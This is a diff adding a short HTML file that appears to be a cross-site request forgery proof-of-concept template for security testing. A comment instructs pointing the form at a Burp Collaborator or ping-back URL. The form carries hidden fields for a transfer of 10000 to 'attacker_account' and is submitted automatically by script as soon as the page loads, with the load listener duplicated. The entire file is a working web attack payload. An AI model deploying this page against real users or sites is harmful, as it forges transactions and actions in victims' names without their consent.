@@ -1,0 +1,27 @@
+<!-- 
+This form auto-submits to the specified URL as soon as the page is loaded.
+Replace the URL in the action attribute with a Burp Collaborator URL or your own ping-back URL. 
+Replace the values of the hidden fields with the desired values.
+-->
+
+<form name="haxform" action="https://{Collaborator / Ping-Back URL}" method="POST">
+    <input type="hidden" name="account" value="attacker_account">
+    <input type="hidden" name="amount" value="10000">
+    <input type="submit">
+</form>
+
+<script>
+    function submitform() {
+        document.forms['haxform'].submit();
+    }
+
+    window.addEventListener('DOMContentLoaded', (event) => {
+        submitform();
+    });
+</script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', (event) => {
+        submitform();
+    });
+</script>
